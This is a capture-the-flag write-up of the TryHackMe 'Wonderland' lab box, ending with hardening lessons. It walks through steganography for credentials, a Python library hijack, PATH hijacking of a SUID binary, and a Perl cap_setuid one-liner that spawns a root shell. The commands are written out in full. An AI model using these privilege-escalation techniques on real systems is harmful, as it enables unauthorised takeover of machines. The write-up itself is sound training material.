---
title: "Wonderland"
platform: "TryHackMe"
difficulty: "hard"
date: "2026-02-11"
status: "complete"
tags: []
---

# Wonderland: Write-up
**Author:** Nelson Hirt  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Linux / Privilege Escalation  

---

## Executive Summary (Attack Chain)
* ✅ **Recon:** Enumerated a web server and discovered a deep recursive directory structure.
* ✅ **Discovery:** Extracted hidden credentials using steganography (`steghide`) on site images.
* ✅ **Initial Access:** SSH login as user `alice`.
* ✅ **Lateral Movement (Rabbit):** Exploited Python Library Hijacking (`random.py`) in a sudo script.
* ✅ **Lateral Movement (Hatter):** Exploited a PATH Hijacking vulnerability in a custom SUID binary (`teaParty`).
* ✅ **Privilege Escalation:** Abused Linux Capabilities (`cap_setuid`) on the Perl binary to gain root access.

---

## 1. Reconnaissance

### Host Configuration
First, mapped the target IP to the hostname for easier reference.

```bash
└─$ sudo sh -c 'echo "<TARGET_IP> wonderland.thm" >> /etc/hosts'
```

### Port Scanning
A standard Nmap scan identified SSH and a Golang-based HTTP server.

```bash
└─$ nmap -sS -sC -sV -Pn -n -T4 wonderland.thm
```

**Open Ports:**
* **22/tcp:** OpenSSH 7.6p1 (Ubuntu)
* **80/tcp:** Golang net/http server

### Web Enumeration
I accessed `http://wonderland.thm/` in the browser to validate the web service, then fuzzed for directories.

```bash
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://wonderland.thm/FUZZ"
```

**Findings:**
* `/img` (Images)
* `/r` (Directory)

### The "Rabbit Hole" (Recursive Directory Structure)
The landing page displayed an image of a white rabbit. Steganography analysis was performed on the image:

```bash
└─$ wget "http://wonderland.thm/img/white_rabbit_1.jpg"
└─$ steghide extract -sf white_rabbit_1.jpg
# Passphrase: (vazia)
# Extracted: hint.txt
```

**Hint Content:** `follow the r a b b i t`

Following the directory structure `/r/a/b/b/i/t/` manually revealed a hidden HTML element in the page source of the final directory:

```html
<p style="display: none;">alice:[REDACTED_PASSWORD]</p>
```

---

## 2. Initial Access & Lateral Movement (Alice → Rabbit)

Using the credentials found in the HTML, SSH access was established as `alice`.

### Sudo Privileges
Enumerating sudo permissions revealed a script that could be run as the user `rabbit`:

```bash
alice@wonderland:~$ sudo -l
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

### Vulnerability: Python Library Hijacking
The script `walrus_and_the_carpenter.py` imports the `random` module. Since the script is located in `/home/alice` (where we have write permissions) and Python prioritizes the current directory for imports, we can create a malicious `random.py` to hijack execution.

**Exploitation:**
1. **Create Malicious Module:**
   ```bash
   alice@wonderland:~$ echo 'import os; os.system("/bin/bash")' > random.py
   ```

2. **Execute Script:**
   ```bash
   alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
   ```

**Result:** The script imported our local `random.py` instead of the standard library, spawning a shell as **rabbit**.

---

## 3. Lateral Movement (Rabbit → Hatter)

### SUID Binary Analysis
In the `/home/rabbit` directory, a custom SUID binary named `teaParty` was found.

```bash
rabbit@wonderland:/home/rabbit$ ls -la teaParty
-rwsr-sr-x 1 root root 16816 May 25 2020 teaParty
```

Executing the binary resulted in a message mentioning a specific date. Analyzing the binary with `ltrace` revealed it was calling the `date` command without an absolute path:

```bash
rabbit@wonderland:/home/rabbit$ ltrace -s 1000 ./teaParty
...
system("/bin/echo -n 'Probably by ' && date --date='next hour' -R") = 60
...
```

### Vulnerability: PATH Hijacking
Because `date` is called relatively (unlike `/bin/echo`), the system looks for the `date` binary in the directories listed in the `$PATH` environment variable.

**Exploitation:**
1. **Create Malicious Binary:**
   ```bash
   rabbit@wonderland:/home/rabbit$ echo -e '#!/bin/bash\n/bin/bash' > date
   rabbit@wonderland:/home/rabbit$ chmod +x date
   ```

2. **Modify PATH:**
   ```bash
   rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit/:$PATH
   ```

3. **Execute SUID Binary + Validate Context:**
   ```bash
   rabbit@wonderland:/home/rabbit$ ./teaParty
   ...
   hatter@wonderland:~$ id
   uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
   ```

**Result:** Although the binary is SUID root, the execution flow resulted in a shell as **hatter** (uid=1003) with the GID inherited from **rabbit** (gid=1002).

*Note: Further enumeration in `/home/hatter` revealed `password.txt` containing Hatter's password.*

---

## 4. Privilege Escalation (Hatter → Root)

### Capability Enumeration
Checking for file capabilities revealed that Perl had the `cap_setuid` capability set:

```bash
hatter@wonderland:/home/hatter$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
```

### Overcoming GID Restrictions
Attempting to exploit this immediately resulted in a "Permission denied" error. A check of the current ID reveals why:

```bash
hatter@wonderland:/home/hatter$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)

hatter@wonderland:/home/hatter$ /usr/bin/perl5.26.1 -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
bash: /usr/bin/perl5.26.1: Permission denied
```

**Root Cause:** Although our UID is `hatter`, our GID is still `rabbit` (inherited from the previous exploit). The Perl binary likely restricts execution based on Group ID.

**Fix:** Use the password found in `password.txt` to spawn a clean login shell for Hatter, correcting the GID.

```bash
hatter@wonderland:/home/hatter$ su hatter
Password: [REDACTED]
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```

### Final Exploitation
With the correct GID, the capability exploit succeeded:

```bash
hatter@wonderland:~$ /usr/bin/perl5.26.1 -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# id
uid=0(root)
```

**Flags Location Swap:**
In a final twist, the flags were swapped:
* **User Flag:** Located in `/root/user.txt`.
* **Root Flag:** Located in `/home/alice/root.txt`.

---

## Lessons Learned
* **Absolute Paths in Scripts:** Scripts running with sudo privileges should always use absolute paths for imports and system calls to prevent hijacking.
* **SUID Binary Hardening:** Custom binaries should use absolute paths for system calls (`/bin/date` instead of `date`) to prevent PATH hijacking.
* **Linux Capabilities:** Capabilities like `cap_setuid` are just as dangerous as SUID bits and must be audited carefully.
* **Group ID (GID) Matters:** When pivoting between users, ensure your Group ID is updated (e.g., via `su`), as file permissions often rely on group membership.

---
*Written by Nelson Hirt*
